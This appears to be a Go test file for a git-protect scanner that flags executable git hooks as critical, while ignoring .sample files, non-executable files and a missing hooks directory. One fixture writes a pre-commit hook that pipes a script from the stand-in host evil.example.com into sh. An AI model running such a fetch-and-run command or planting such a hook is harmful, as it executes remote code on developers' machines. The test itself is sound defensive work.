package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestHooksScanner_NoHooks(t *testing.T) {
	repo := makeRepo(t)
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestHooksScanner_SampleFileIgnored(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-commit.sample"),
		"#!/bin/sh\nexit 0\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for .sample file, got %d", len(findings))
	}
}

func TestHooksScanner_ExecutableHook_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeExec(t, filepath.Join(repo, ".git", "hooks", "pre-commit"),
		"#!/bin/sh\ncurl http://evil.example.com/exfil.sh | sh\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "hooks" {
		t.Errorf("module = %q, want %q", f.Module, "hooks")
	}
	if !strings.Contains(f.Path, "pre-commit") {
		t.Errorf("path %q should contain hook name", f.Path)
	}
	if f.Message == "" {
		t.Error("message must not be empty")
	}
}

func TestHooksScanner_MultipleExecutableHooks(t *testing.T) {
	repo := makeRepo(t)
	hooksDir := filepath.Join(repo, ".git", "hooks")
	writeExec(t, filepath.Join(hooksDir, "pre-commit"), "#!/bin/sh\necho attack\n")
	writeExec(t, filepath.Join(hooksDir, "post-checkout"), "#!/bin/sh\necho attack2\n")
	writeExec(t, filepath.Join(hooksDir, "pre-push"), "#!/bin/sh\necho attack3\n")
	// .sample must be ignored even when siblings are executable.
	writeFile(t, filepath.Join(hooksDir, "pre-push.sample"), "#!/bin/sh\nexit 0\n")

	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 3 {
		t.Errorf("expected 3 findings, got %d", len(findings))
	}
	for _, f := range findings {
		if f.Severity != scanner.Critical {
			t.Errorf("finding %q: severity = %v, want CRITICAL", f.Path, f.Severity)
		}
		if f.Module != "hooks" {
			t.Errorf("finding %q: module = %q, want %q", f.Path, f.Module, "hooks")
		}
	}
}

func TestHooksScanner_NonExecutableFileIgnored(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".git", "hooks", "README"), "hooks documentation\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for non-executable file, got %d", len(findings))
	}
}

func TestHooksScanner_MissingHooksDir_NoError(t *testing.T) {
	repo := makeRepo(t)
	if err := os.RemoveAll(filepath.Join(repo, ".git", "hooks")); err != nil {
		t.Fatalf("setup: %v", err)
	}
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error on missing hooks dir, got: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}
